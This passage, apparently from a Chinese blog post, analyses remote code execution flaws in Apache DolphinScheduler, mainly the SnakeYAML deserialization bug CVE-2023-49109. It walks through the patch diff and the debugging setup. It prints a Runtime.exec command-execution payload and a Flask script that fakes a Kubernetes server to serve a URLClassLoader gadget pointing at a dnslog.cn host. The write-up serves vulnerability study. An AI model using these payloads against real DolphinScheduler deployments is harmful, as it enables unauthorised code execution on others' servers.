src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713335681723-b181976e-1628-477e-b222-ff0b6f6e763a.png#averageHue=%23fefdfd&clientId=uec846445-2f9d-4&from=paste&height=633&id=u35f614fb&originHeight=1187&originWidth=901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=44600&status=done&style=none&taskId=u0a8f222c-669a-489c-8d42-3524a1ba7ea&title=&width=480.53333333333336\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后保存工作流的时候，记得全局变量 payload 设置一下 <code>payload</code>:<code>function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\\&quot;touch /tmp/stooceashell\\&quot;)</code><br>最终 content 就为我们设置的全局变量<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713335764313-5148e30e-e268-4463-a0bd-7f81680d0a14.png#averageHue=%23383d46&clientId=uec846445-2f9d-4&from=paste&height=646&id=u274ce0f9&originHeight=1211&originWidth=2417&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=978105&status=done&style=none&taskId=u70a26c6b-74d9-490c-8265-6dad456fbcf&title=&width=1289.0666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h1 id=\"CVE-2023-49109\"><a href=\"#CVE-2023-49109\" class=\"headerlink\" title=\"CVE-2023-49109\"></a>CVE-2023-49109</h1><h2 id=\"0x01-初步定位\"><a href=\"#0x01-初步定位\" class=\"headerlink\" title=\"0x01 初步定位\"></a>0x01 初步定位</h2><p>根据漏洞提送的报告，好像是一个 snakeyaml 反序列化漏洞<br>不过具体功能还是心里没有底，diff 一下源码<br><a href=\"https://github.com/apache/dolphinscheduler/pull/14991/commits/5d03771107576910dd690f7f835f28ba17c11499\">https://github.com/apache/dolphinscheduler/pull/14991/commits/5d03771107576910dd690f7f835f28ba17c11499</a><br>可以看到的是 createnamespace 以及 updatenamespace 这一块全部删除<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713666461961-7f0d1506-0e45-4d9b-ab0d-86441a8d3c1d.png#averageHue=%23a3c9c4&clientId=u47f1a633-3702-4&from=paste&height=600&id=u17c0d82e&originHeight=1125&originWidth=2514&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=197974&status=done&style=none&taskId=u6081e0f9-b85b-44a6-b229-62e226729c1&title=&width=1340.8\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>只剩下这一段 controller</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C792EA\">public</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Result</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">createNamespace</span><span style=\"color: #89DDFF\">(@</span><span style=\"color: #C792EA\">Parameter</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">hidden</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">true)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">@</span><span style=\"color: #C792EA\">RequestAttribute</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> Constants</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">SESSION_USER</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">User</span><span style=\"color: #BABED8\"> loginUser</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                                  </span><span style=\"color: #89DDFF\">@</span><span style=\"color: #C792EA\">RequestParam</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">namespace</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> namespace</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                                  </span><span style=\"color: #89DDFF\">@</span><span style=\"color: #C792EA\">RequestParam</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">clusterCode</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Long</span><span style=\"color: #BABED8\"> clusterCode</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Map</span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #C792EA\">String</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Object</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> result </span><span style=\"color: #89DDFF\">=</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                k8sNamespaceService</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">createK8sNamespace</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">loginUser</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> namespace</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> clusterCode</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">returnDataList</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">result</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>也就是中间的处理逻辑都没有了，根据这段评论可以了解得到更新<code>**K8sNamespace**</code>的内容全部删除了，只剩下一段创建的逻辑<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713666695853-79c9e7b8-8d24-4ce9-aa81-0efd5396260d.png#averageHue=%2311161d&clientId=u47f1a633-3702-4&from=paste&height=233&id=u92acdca6&originHeight=436&originWidth=981&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=46929&status=done&style=none&taskId=u69105f66-3c45-4ce6-8b83-46ae848ec36&title=&width=523.2\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>所以，本次改动将 <code>createNamespace</code>的内容和 upadateNamespace 的内容合并了，只剩下了<code>createK8sNamespace(loginUser, namespace, clusterCode);</code>的逻辑处理。当然这只是仅仅针对于 controller 路由的内容，当前 commit 下其实还有很多地方修改了，不过都是针对于当前功能实现逻辑的删除，我们跟进当前路由的逻辑即可</p>\n<h2 id=\"0x02-漏洞逻辑分析\"><a href=\"#0x02-漏洞逻辑分析\" class=\"headerlink\" title=\"0x02 漏洞逻辑分析\"></a>0x02 漏洞逻辑分析</h2><p>diff 之后剩下了 <code>k8sNamespaceService.createK8sNamespace(loginUser, namespace, clusterCode, limitsCpu, limitsMemory);</code>，也就是说<code>k8sNamespaceService.updateK8sNamespace</code>被删除了，我们跟进的话，肯定是跟进<code>updateK8sNamespace</code>（事后走逻辑分析，这里其实不论是 create 还是 update 都能触发，因为两者实现功能的逻辑是一样的，不然两个功能为什么能合并呢）<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713667528720-1fb09951-3e1e-4814-a914-4b2e1adc2126.png#averageHue=%23343941&clientId=u47f1a633-3702-4&from=paste&height=463&id=u95799a44&originHeight=869&originWidth=2300&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=629606&status=done&style=none&taskId=u8e6904d3-72aa-4829-b3c7-a419be19cf3&title=&width=1226.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>调试环境都是一样的使用 idea 远程调试，docker 环境也还是之前的，只要不是 3.2.1 版本及以后的就行<br>触发点在哪呢？<br>那么根据路由的 english，应该就是找 k8s 的 createnamespace 或者 update 都行<br>翻找一下后台应该很容易就找到了，limitcpu，limitsMemory 都能正确对应<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713667672780-54f36b71-b1bb-4275-8a9d-f3fe6d3a880a.png#averageHue=%23aab083&clientId=u47f1a633-3702-4&from=paste&height=695&id=u9024964a&originHeight=1303&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=167480&status=done&style=none&taskId=u7ed96a12-ddfd-4c0b-b4ef-ca1863000fb&title=&width=1365.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里随便填数据之后，断点打在 create 就行<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713667846006-1c17561b-ce02-4b22-9ba3-0f14055097c1.png#averageHue=%233e434e&clientId=u47f1a633-3702-4&from=paste&height=281&id=u59a1ce95&originHeight=527&originWidth=2235&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=363680&status=done&style=none&taskId=ucf0def85-591e-43a6-a791-024cf7035a8&title=&width=1192\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里跟进之后会发现有一段 if 判断逻辑过不去，也就是我们首次跟进<code>createK8sNamespace</code>的时候，获取数据以及 set 属性变量之后，他会判断我们当前指定的集群环境是否为已有或已经加载的集群环境，如果是的话，就不会进入 yaml 的字符串处理和加载了，所以这里我们需要新建一段集群环境<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713669076603-278e42c2-ef65-40fa-a23f-afd94e0177fd.png#averageHue=%23414653&clientId=u47f1a633-3702-4&from=paste&height=229&id=ocAuC&originHeight=429&originWidth=2355&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=248883&status=done&style=none&taskId=ud09e9a45-c94b-4741-951a-dda371863bf&title=&width=1256\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>直到这里遇到了很大的问题，这里我选择的是 docke 环境搭建，在后台创建集群环境需要按照正常的格式去写配置信息，写了之后还没完，它是真会往你所写的地址上找同名的 namespace，不然最后将找到的 namespace list 的时候会报空错，也就是找不到有效的 namespace。这里我实在没有学过 k8s 相关的内容，去请教了 drunkbaby 师傅，推荐了一篇文章，这才找到了正解。（顺便吐槽一些文章，说环境不行，直接 idea evaluate expression 执行 yaml.loadAs。。可能是我水平不够，就喜欢钻这些点吧）</p></blockquote>\n<p>参考文章如下<br><a href=\"https://xz.aliyun.com/t/13981?time__1311=mqmxnQDtDQG=M40veeqBK37Kku7xclppOYD&alichlgref=https://www.google.com.hk/#toc-4\">https://xz.aliyun.com/t/13981</a></p>\n<div class=\"language-yaml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">yaml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F07178\">apiVersion</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">v1</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">clusters</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F07178\">cluster</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #F07178\">server</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">http://127.0.0.1:5000</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #F07178\">name</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">kubernetes</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">contexts</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F07178\">context</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #F07178\">cluster</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">kubernetes</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #F07178\">name</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">kubernetes-admin@kubernetes</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">current-context</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">kubernetes-admin@kubernetes</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">kind</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Config</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">preferences</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;&#125;</span></span>\n<span class=\"line\"><span style=\"color: #F07178\">users</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">[]</span></span></code></pre></div><p>师傅的本地 flask 脚本要改一下，下面这段 flaskpy 代码的内容，大致就是伪造了一个集群 server，保证对方在目标集群中查询 namespace 的时候能够找到同名的 namespace，这也是为什么我们伪造集群中的 namespace 的 name 是那一段 yamlpayload</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> flask </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> Flask</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> jsonify</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">app </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">Flask</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">__name__</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">@</span><span style=\"color: #82AAFF\">app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">route</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/api/v1/namespaces</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">methods</span><span style=\"color: #89DDFF\">=[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GET</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">POST</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">get_namespaces</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    namespaces </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">kind</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">NamespaceList</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">apiVersion</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">v1</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">metadata</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">selfLink</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">/api/v1/namespaces</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">resourceVersion</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">123456</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">&#125;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">items</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">[</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">metadata</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">name</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [</span><span style=\"color: #BABED8\">\\&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">175i4z</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">dnslog</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">cn</span><span style=\"color: #89DDFF\">\\</span><span style=\"color: #BABED8\">&quot;]]]]&quot;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">uid</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">9c8b7a6f</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">creationTimestamp</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">2024-02-22T12:00:00Z</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&#125;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">spec</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">finalizers</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">[]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&#125;,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">status</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">phase</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Active</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">      </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">jsonify</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">namespaces</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> __name__ </span><span style=\"color: #89DDFF\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">__main__</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">run</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">debug</span><span style=\"color: #89DDFF\">=True,</span><span style=\"color: #BABED8; font-style: italic\">host</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">192.168.86.135</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><p>后续就能够跟进到<code>upsertNamespacedResourceToK8s(k8sNamespace, yamlStr)</code>中执行 yaml 代码了，后续就不跟进了，这一段基本功看的我五体投地</p>\n<p>补充一点忘记写了：<br>这里 yaml 代码的获取是在上述<code>upsertNamespaceToK8s</code>方法中，他会获取到我们传入的 namespace，执行 getNamespaceFromK8s 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1714112814726-5082c94b-a3d9-4b3b-bf87-ff3828b92e44.png#averageHue=%2332322e&clientId=u070a54b9-6d60-4&from=paste&height=386&id=u8ceb24b1&originHeight=724&originWidth=1492&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=274003&status=done&style=none&taskId=u6f3563a3-1cab-454b-a1de-0f08e9f0bf0&title=&width=795.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>我们跟进<code>getNamespaceFromK8s</code>，这里的逻辑是创建一段标准的 namespaceyaml 格式 字符串，然后根据${}标识符替换内容，我们传参的 namespace 就是在这一步被替换上去的，具体的由于时间过久了，这一部分是我事后补充的，搭建环境就没复现了，师傅们可以自己跟进一波<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1714112869350-8c4d0ee9-55a7-48a6-8fe7-b3083c18b47d.png#averageHue=%2332322e&clientId=u070a54b9-6d60-4&from=paste&height=307&id=uda2d3c94&originHeight=575&originWidth=1925&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=276387&status=done&style=none&taskId=uc2b86109-7052-4f46-a453-749e1a0f519&title=&width=1026.6666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n","feature":true,"text":"包括如下几个 cve：CVE-2023-49299 CVE-2024-23320 漏洞描述 Apache DolphinScheduler 是一个分布式、易扩展...","permalink":"/post/Apache DolphinScheduler 任意代码执行漏洞分析","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"CVE","slug":"CVE","count":1,"path":"api/categories/CVE.json"}],"tags":[{"name":"CVESearch","slug":"CVESearch","count":1,"path":"api/tags/CVESearch.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">漏洞描述</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2023-49299-CVE-2024-23320\"><span class=\"toc-text\">CVE-2023-49299 CVE-2024-23320</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞点分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90\"><span class=\"toc-text\">0x01 工作流程分析</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0\"><span class=\"toc-text\">0x02 漏洞攻击实现</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-1-9-%E7%89%88%E6%9C%AC-diff-%E5%88%86%E6%9E%90\"><span class=\"toc-text\">3.1.9 版本 diff 